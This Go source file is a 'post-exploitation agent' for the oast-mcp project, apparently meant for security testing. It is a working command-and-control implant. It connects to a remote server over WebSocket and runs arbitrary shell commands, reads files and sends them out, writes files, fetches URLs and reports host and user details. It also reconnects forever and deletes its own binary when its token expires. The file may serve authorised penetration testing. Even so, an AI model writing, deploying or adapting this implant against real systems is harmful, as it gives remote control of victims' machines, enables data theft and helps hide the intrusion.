// Copyright 2026 Davide Guerri <davide.guerri@gmail.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Command agent is a lightweight post-exploitation agent that connects to
// the oast-mcp server over a secure WebSocket and executes scheduled tasks.
package main

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"

	"github.com/dguerri/oast-mcp/internal/agent"
	"github.com/dguerri/oast-mcp/internal/store"
	"github.com/gorilla/websocket"
)

var (
	serverURL = flag.String("url", "", "agent server base URL e.g. https://agent.example.com")
	token     = flag.String("token", "", "agent JWT token")
	agentID   = flag.String("id", "", "agent ID")
	insecure  = flag.Bool("k", false, "skip TLS certificate verification")
)

type inMsg struct {
	Type       string         `json:"type"`
	TaskID     string         `json:"task_id,omitempty"`
	Capability string         `json:"capability,omitempty"`
	Params     map[string]any `json:"params,omitempty"`
	Timeout    int            `json:"timeout,omitempty"` // seconds; 0 means use capability default
	Message    string         `json:"message,omitempty"`
}

type outMsg struct {
	Type   string         `json:"type"`
	TaskID string         `json:"task_id,omitempty"`
	Ok     bool           `json:"ok,omitempty"`
	Data   map[string]any `json:"data,omitempty"`
	Error  string         `json:"error,omitempty"`
}

// taskRegistry tracks cancel functions for running tasks so that a cancel
// message from the server can abort the corresponding subprocess.
type taskRegistry struct {
	mu      sync.Mutex
	cancels map[string]context.CancelFunc
}

func newTaskRegistry() *taskRegistry {
	return &taskRegistry{cancels: make(map[string]context.CancelFunc)}
}

func (r *taskRegistry) register(taskID string, cancel context.CancelFunc) {
	r.mu.Lock()
	r.cancels[taskID] = cancel
	r.mu.Unlock()
}

func (r *taskRegistry) cancel(taskID string) {
	r.mu.Lock()
	if fn, ok := r.cancels[taskID]; ok {
		fn()
	}
	r.mu.Unlock()
}

func (r *taskRegistry) remove(taskID string) {
	r.mu.Lock()
	delete(r.cancels, taskID)
	r.mu.Unlock()
}

func wsURL(base string) string {
	u, _ := url.Parse(base)
	u.Scheme = "wss"
	return u.String()
}

func runOnce() error {
	dialer := websocket.Dialer{TLSClientConfig: &tls.Config{InsecureSkipVerify: *insecure}} //nolint:gosec
	conn, _, err := dialer.Dial(wsURL(*serverURL), nil)
	if err != nil {
		return err
	}
	defer func() { _ = conn.Close() }()

	reg, _ := json.Marshal(map[string]any{
		"type":         "register",
		"agent_id":     *agentID,
		"token":        *token,
		"capabilities": agent.AllCapabilities,
		"insecure":     *insecure,
	})
	if err := conn.WriteMessage(websocket.TextMessage, reg); err != nil {
		return err
	}

	registry := newTaskRegistry()
	results := make(chan outMsg, 32)

	// Serialise all writes to the WebSocket connection via a single goroutine.
	var writeErr error
	var writeDone = make(chan struct{})
	go func() {
		defer close(writeDone)
		for msg := range results {
			b, _ := json.Marshal(msg)
			if err := conn.WriteMessage(websocket.TextMessage, b); err != nil {
				writeErr = err
				return
			}
		}
	}()

	var readErr error
	for {
		if err := conn.SetReadDeadline(time.Now().Add(35 * time.Second)); err != nil {
			readErr = err
			break
		}
		_, raw, err := conn.ReadMessage()
		if err != nil {
			readErr = err
			break
		}

		var msg inMsg
		if err := json.Unmarshal(raw, &msg); err != nil {
			continue
		}

		if fatal := dispatchMessage(msg, results, registry); fatal != nil {
			readErr = fatal
			goto done
		}
	}

done:
	close(results)
	<-writeDone
	if writeErr != nil {
		return writeErr
	}
	return readErr
}

// dispatchMessage processes one inbound WebSocket message. Returns a non-nil
// error only for fatal conditions that should terminate the read loop.
func dispatchMessage(msg inMsg, results chan outMsg, registry *taskRegistry) error {
	switch msg.Type {
	case "error":
		if msg.Message == "token_expired" {
			selfDelete()
			os.Exit(0)
		}
		return fmt.Errorf("server error: %s", msg.Message)
	case "ping":
		results <- outMsg{Type: "pong"}
	case "cancel":
		registry.cancel(msg.TaskID)
	case "task":
		timeoutSecs := msg.Timeout
		if timeoutSecs <= 0 {
			timeoutSecs = store.DefaultTaskTimeoutSecs
		}
		ctx, cancelFn := context.WithTimeout(
			context.Background(),
			time.Duration(timeoutSecs)*time.Second,
		)
		registry.register(msg.TaskID, cancelFn)
		go func(m inMsg, ctx context.Context, cancel context.CancelFunc) {
			defer cancel()
			defer registry.remove(m.TaskID)
			results <- handleTask(ctx, m)
		}(msg, ctx, cancelFn)
	}
	return nil
}

func handleTask(ctx context.Context, msg inMsg) outMsg {
	tid := msg.TaskID
	params := msg.Params
	if params == nil {
		params = map[string]any{}
	}

	var data map[string]any
	var execErr string

	switch msg.Capability {
	case agent.CapExec:
		cmd, _ := params["cmd"].(string)
		out, code, err := runCmd(ctx, cmd)
		if err != nil {
			execErr = err.Error()
		} else {
			data = map[string]any{"output": out, "exit_code": code}
		}

	case agent.CapReadFile:
		path, _ := params["path"].(string)
		b, err := os.ReadFile(path)
		if err != nil {
			execErr = err.Error()
		} else {
			data = map[string]any{"content": base64.StdEncoding.EncodeToString(b), "path": path}
		}

	case agent.CapWriteFile:
		path, _ := params["path"].(string)
		contentB64, _ := params["content_b64"].(string)
		modeStr, _ := params["mode"].(string)
		if path == "" {
			execErr = "path is required"
			break
		}
		if contentB64 == "" {
			execErr = "content_b64 is required"
			break
		}
		decoded, err := base64.StdEncoding.DecodeString(contentB64)
		if err != nil {
			execErr = "invalid base64: " + err.Error()
			break
		}
		var perm os.FileMode = 0644
		if modeStr != "" {
			parsed, err := strconv.ParseUint(modeStr, 8, 32)
			if err != nil {
				execErr = "invalid mode: " + err.Error()
				break
			}
			perm = os.FileMode(parsed)
		}
		if err := os.WriteFile(path, decoded, perm); err != nil {
			execErr = err.Error()
		} else {
			data = map[string]any{"bytes_written": len(decoded)}
		}

	case agent.CapFetchURL:
		rawURL, _ := params["url"].(string)
		client := &http.Client{}
		if *insecure {
			client.Transport = &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
			}
		}
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
		if err != nil {
			execErr = err.Error()
			break
		}
		resp, err := client.Do(req)
		if err != nil {
			execErr = err.Error()
		} else {
			defer func() { _ = resp.Body.Close() }()
			body, _ := io.ReadAll(resp.Body)
			data = map[string]any{
				"status": resp.StatusCode,
				"body":   base64.StdEncoding.EncodeToString(body),
			}
		}

	case agent.CapSystemInfo:
		hostname, _ := os.Hostname()
		data = map[string]any{
			"hostname": hostname,
			"os":       runtime.GOOS,
			"arch":     runtime.GOARCH,
			"user":     currentUser(),
		}

	default:
		execErr = "unknown capability: " + msg.Capability
	}

	if execErr != "" {
		return outMsg{Type: "result", TaskID: tid, Ok: false, Error: execErr}
	}
	return outMsg{Type: "result", TaskID: tid, Ok: true, Data: data}
}

func currentUser() string {
	if u := os.Getenv("USER"); u != "" {
		return u
	}
	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}
	return "unknown"
}

func selfDelete() {
	if p, err := os.Executable(); err == nil {
		_ = os.Remove(p)
	}
}

func main() {
	flag.Parse()
	if *serverURL == "" || *token == "" || *agentID == "" {
		fmt.Fprintln(os.Stderr, "usage: agent -url URL -token TOKEN -id AGENT_ID")
		os.Exit(1)
	}

	backoff := time.Second
	for {
		_ = runOnce()
		time.Sleep(backoff)
		if backoff < 60*time.Second {
			backoff *= 2
		}
	}
}
